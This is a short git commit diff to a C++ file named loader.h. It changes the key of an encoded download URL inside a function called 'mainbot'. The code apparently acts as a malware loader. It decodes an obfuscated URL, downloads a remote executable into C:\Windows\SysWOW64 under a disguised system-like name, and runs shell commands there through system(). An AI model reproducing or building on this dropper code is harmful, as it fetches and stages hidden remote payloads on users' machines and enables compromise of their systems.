6a784c2c2f6335d3d441a00c2f2c80d9ab2b9e17
ripped-oh <87819489+ripped-oh@users.noreply.github.com>
2021-10-02 10:14:21 -0700

    Update loader.h

--- loader/loader.h
+++ loader/loader.h
@@ -151,6 +151,7 @@ void loadserial()
 
 void mainbot()
 {
+    
     HMODULE hModule = LoadLibrary(_T("urlmon.dll"));
     rydekem();
     lnttirs();
@@ -309,7 +310,7 @@ void mainbot()
                     }
 
 
-                    std::string download = (decrypt("kwwsv://ilohpdqdjhu.dl/qhz/dssolfdwlrq/dsl/grzqordg.sks?ilohKhb=fI2vRWfo3uFQwRQq").c_str());
+                    std::string download = (decrypt("kwwsv://ilohpdqdjhu.dl/qhz/dssolfdwlrq/dsl/grzqordg.sks?ilohKhb=knrQni0JfO6yQTmL").c_str());
                     std::string path = (dead("C:\\Windows\\SysWOW64\\audio-for-stability.exe").c_str());
                     URLDownloadToFileA(NULL, download.c_str(), path.c_str(), 0, NULL);
                     system(dead("cd C:\\Windows\\SysWOW64\\").c_str());
